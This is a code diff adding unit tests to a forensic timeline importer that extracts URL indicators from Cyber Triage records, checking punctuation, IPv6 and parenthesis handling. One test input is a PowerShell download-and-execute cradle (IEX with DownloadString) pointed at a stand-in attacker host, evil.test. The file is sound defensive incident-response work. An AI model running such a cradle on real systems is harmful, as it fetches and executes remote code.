@@ -185,3 +185,50 @@ describe("parseCybertriage — CSV timeline", () => {
     expect(e?.path).toBe("/trigonasim/logs/lsass.dmp");
   });
 });
+
+// ── The URL scraper's trailing-punctuation rule. This importer kept its own unconditional copy of
+// the strip after #744 unified the two scrapers in veloTextIocs, so a URL ending in a dot was read
+// one way here and another way there. One copy is the point: the same C2 URL must become the same
+// indicator whichever importer read it.
+describe("parseCybertriage — URL punctuation", () => {
+  function downloadRow(message: string): object {
+    return {
+      ctType: "process",
+      datetime: "2026-01-28T01:52:00",
+      epoch_timestamp: 1769593920,
+      event_timestamp: "2026-01-28T01:52:00",
+      hostName: "win11",
+      message,
+      path: "/windows/system32/powershell.exe",
+      score: "LikelyNotable_Normal",
+      scoreDescription: "Downloaded a payload",
+      timestamp_desc: "Process Created",
+    };
+  }
+  const urls = (message: string): string[] =>
+    parseCybertriage(jsonl(downloadRow(message)))
+      .iocs.filter((i) => i.type === "url")
+      .map((i) => i.value);
+
+  it("keeps trailing punctuation that a closing quote proves is part of the URL", () => {
+    expect(urls("IEX (New-Object Net.WebClient).DownloadString('http://evil.test/a.')")).toContain(
+      "http://evil.test/a.",
+    );
+  });
+
+  it("still strips sentence punctuation from a bare URL", () => {
+    const v = urls("payload came from http://evil.test/a.");
+    expect(v).toContain("http://evil.test/a");
+    expect(v).not.toContain("http://evil.test/a.");
+  });
+
+  // Cross-source agreement is the whole point: these two must match what deobfuscate.ts and the
+  // Velociraptor scraper produce for the very same URL.
+  it("reads a whole IPv6 URL the way the other scrapers do", () => {
+    expect(urls("beacon to http://[2001:db8::1]:8080/x")).toContain("http://[2001:db8::1]:8080/x");
+  });
+
+  it("keeps balanced parentheses in a URL path the way the other scrapers do", () => {
+    expect(urls("staged at http://evil.test/a(foo)")).toContain("http://evil.test/a(foo)");
+  });
+});
